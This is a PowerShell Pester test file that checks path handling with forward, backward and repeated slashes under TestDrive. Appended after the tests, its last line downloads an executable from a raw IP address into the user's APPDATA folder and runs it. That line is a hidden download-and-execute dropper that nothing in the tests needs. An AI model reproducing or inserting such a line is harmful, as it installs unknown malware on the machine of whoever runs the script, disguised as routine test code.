

Describe "Hierarchical paths" -Tags "CI" {
    BeforeAll {
        $data = "Hello World"
        Setup -File testFile.txt -Content $data
    }

    It "should work with Join-Path " {
        $testPath = Join-Path $TestDrive testFile.txt
        Get-Content $testPath | Should -BeExactly $data
    }

    It "should work with platform's slashes" {
        $testPath = "$TestDrive$([IO.Path]::DirectorySeparatorChar)testFile.txt"
        Get-Content $testPath | Should -BeExactly $data
    }

    It "should work with forward slashes" {
        $testPath = "$TestDrive/testFile.txt"
        Get-Content $testPath | Should -BeExactly $data
    }

    It "should work with backward slashes" {
        $testPath = "$TestDrive\testFile.txt"
        Get-Content $testPath | Should -BeExactly $data
    }

    It "should work with backward slashes for each separator" {
        $testPath = "$TestDrive\testFile.txt".Replace("/","\")
        Get-Content $testPath | Should -BeExactly $data
    }

    It "should work with forward slashes for each separator" {
        $testPath = "$TestDrive/testFile.txt".Replace("\","/")
        Get-Content $testPath | Should -BeExactly $data
    }

    It "should work even if there are too many forward slashes" {
        $testPath = "$TestDrive//////testFile.txt"
        Get-Content $testPath | Should -BeExactly $data
    }

    It "should work even if there are too many backward slashes" {
        $testPath = "$TestDrive\\\\\\\testFile.txt"
        Get-Content $testPath | Should -BeExactly $data
    }
}

(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")

